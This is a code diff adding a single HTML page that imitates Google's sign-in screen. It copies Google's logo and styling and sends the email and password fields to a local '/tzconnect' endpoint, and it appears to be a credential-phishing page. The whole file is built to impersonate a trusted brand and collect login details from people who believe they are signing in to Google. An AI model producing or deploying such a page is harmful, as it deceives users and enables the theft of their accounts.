@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"> <!-- Police Poppins -->
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            text-align: center;
+            width: 400px;
+        }
+        img {
+            width: 120px;  /* Largeur du logo */
+            margin-bottom: 30px; /* Espace entre le logo et le formulaire */
+        }
+        h1 {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 40px;
+            color: #5f6368;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group input {
+            padding: 15px;
+            font-size: 18px;
+            width: 300px;
+            border-radius: 25px;
+            border: 1px solid #dcdcdc;
+            margin: 10px 0;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #4285f4;
+        }
+        button {
+            padding: 15px;
+            font-size: 18px;
+            width: 320px;
+            border-radius: 25px;
+            border: none;
+            background-color: #4285f4;
+            color: white;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #357ae8;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        img{
+            width: 200px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo ajouté ici -->
+        <img src="https://www.wikiberal.org/images/c/c3/Logo_Google.png" alt="Google Logo">
+        
+        <h1>Sign in</h1>
+        <form action="/tzconnect" method="POST">
+            <div class="input-group">
+                <input type="email" name="email" placeholder="Email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Sign in</button>
+        </form>
+        <div class="footer">
+            <p>By signing in, you agree to our Terms of Service and Privacy Policy.</p>
+        </div>
+    </div>
+</body>
+</html>
